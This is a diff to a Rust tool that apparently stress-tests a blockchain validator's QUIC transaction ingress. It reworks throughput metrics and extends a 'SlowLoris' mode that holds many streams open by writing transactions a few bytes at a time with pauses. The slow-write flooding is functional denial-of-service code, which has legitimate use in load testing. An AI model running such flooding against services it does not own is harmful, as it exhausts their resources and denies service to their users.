@@ -174,36 +174,41 @@ fn main() {
                     let metrics_interval = Duration::from_secs(5);
                     let mut last_blockhash_refresh = Instant::now();
                     let mut latest_blockhash = client.get_latest_blockhash().unwrap();
-                    let mut curr_txn_count = 0u64;
+                    let mut curr_success_count = 0u64;
                     let mut curr_fail_count = 0u64;
-                    let mut cumm_txn_count = 0u64;
+                    let mut cumm_success_count = 0u64;
                     let mut cumm_fail_count = 0u64;
                     loop {
                         let now = Instant::now();
                         let elapsed = now.sub(last_blockhash_refresh);
                         if elapsed > metrics_interval {
-                            cumm_txn_count += curr_txn_count;
+                            cumm_success_count += curr_success_count;
                             cumm_fail_count += curr_fail_count;
+                            let curr_txn_count = curr_success_count + curr_fail_count;
+                            let total_txn_count = cumm_success_count + cumm_fail_count;
                             info!(
-                                "thread_{thread_id} txn/sec: {:.0}, \
-                                success: {}, \
+                                "thread_{thread_id} msgs/sec: {:.0}, \
+                                success: {curr_success_count}, \
                                 fail: {curr_fail_count}, \
-                                total txn: {cumm_txn_count}, \
-                                total success %: {:.1}",
+                                total txn: {total_txn_count}, \
+                                overall success %: {:.1}",
                                 (curr_txn_count) as f64 / elapsed.as_secs_f64(),
-                                curr_txn_count - curr_fail_count,
-                                (1.0 - (cumm_fail_count as f64 / cumm_txn_count as f64)) * 100.0
+                                (cumm_success_count as f64 / total_txn_count as f64) * 100.0
                             );
                             last_blockhash_refresh = now;
 
-                            curr_txn_count = 0;
+                            curr_success_count = 0;
                             curr_fail_count = 0;
                             latest_blockhash = client.get_latest_blockhash().unwrap();
                         }
 
+                        let count = cumm_success_count
+                            + cumm_fail_count
+                            + curr_success_count
+                            + curr_fail_count;
                         let serialized_txns: Vec<Vec<u8>> = (0..TXN_BATCH_SIZE)
                             .filter_map(|i| {
-                                let lamports = cumm_txn_count + curr_txn_count + i;
+                                let lamports = count + i;
                                 let txn = transfer(
                                     &keypair,
                                     &keypair.pubkey(),
@@ -219,12 +224,11 @@ fn main() {
                                 serialize(&txn).ok()
                             })
                             .collect();
-                        let txn_count = serialized_txns.len() as u64;
-                        curr_txn_count += txn_count;
                         let (_successes, fails): (Vec<()>, Vec<PacketBlasterError>) = RUNTIME
                             .block_on(tpu_sender.send(serialized_txns))
                             .into_iter()
                             .partition_result();
+                        curr_success_count += _successes.len() as u64;
 
                         curr_fail_count += fails.len() as u64;
 
@@ -414,25 +418,26 @@ impl TpuSender {
             TpuSender::SlowLoris {
                 connection,
                 sleep_interval,
-                num_streams_per_conn: _num_streams_per_conn,
+                num_streams_per_conn,
             } => {
-                let futures = serialized_txns.into_iter().map(|txn| async move {
-                    //TODO: use all args.num_stream_count
-                    let mut send_stream = connection
-                        .open_uni()
-                        .await
-                        .map_err(PacketBlasterError::ConnectionError)?;
-                    let stream_id = 0;
-                    // Send a full size packet with single byte writes sequentially
-                    for chunk in txn.chunks(2) {
-                        // info!("sending byte[{i}] for stream_{stream_id}");
-                        send_stream.write_all(chunk).await?;
-                        tokio::time::sleep(*sleep_interval).await;
-                    }
-                    send_stream.finish().await?;
+                let futures = serialized_txns
+                    .into_iter()
+                    .cartesian_product(0..*num_streams_per_conn)
+                    .map(|(txn, _stream_id)| async move {
+                        let mut send_stream = connection
+                            .open_uni()
+                            .await
+                            .map_err(PacketBlasterError::ConnectionError)?;
+                        // less than 4 bytes fails a fter a few mins
+                        for chunk in txn.chunks(4) {
+                            // info!("sending byte[{i}] for stream_{stream_id}");
+                            send_stream.write_all(chunk).await?;
+                            tokio::time::sleep(*sleep_interval).await;
+                        }
+                        send_stream.finish().await?;
 
-                    Ok::<(), PacketBlasterError>(())
-                });
+                        Ok::<(), PacketBlasterError>(())
+                    });
 
                 let results: Vec<Result<(), PacketBlasterError>> =
                     futures_util::future::join_all(futures).await;
@@ -446,7 +451,7 @@ impl TpuSender {
         }
     }
 
-    /// Breaks up a txn into 1 byte sized writes over a quic stream
+    /// Breaks up a txn into 1 byte sized writes over a quic stream. fails when used in send(), not sure why
     async fn stream_txn_slowly(
         connection: Arc<quinn::Connection>,
         txn: Vec<u8>,
